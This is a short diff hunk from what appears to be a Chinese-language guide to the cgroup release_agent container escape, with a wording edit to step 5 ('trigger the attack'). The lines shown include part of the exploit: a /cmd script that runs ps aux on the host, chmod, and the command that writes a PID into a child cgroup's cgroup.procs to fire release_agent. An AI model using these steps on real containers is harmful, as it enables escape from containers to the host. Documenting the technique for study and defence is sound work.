@@ -41,8 +41,8 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
 5. **触发攻击：**
-- 在 "x" 子 cgroup 内启动一个进程，并立即终止。
-- 这会触发 `release_agent`（/cmd 脚本），该脚本在主机上执行 ps aux 并将输出写入容器内的 /output。
+- 在 "x" 子 cgroup 中启动一个进程，并立即终止。
+- 这会触发 `release_agent`（/cmd 脚本），该脚本在主机上执行 ps aux 并将输出写入容器中的 /output。
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
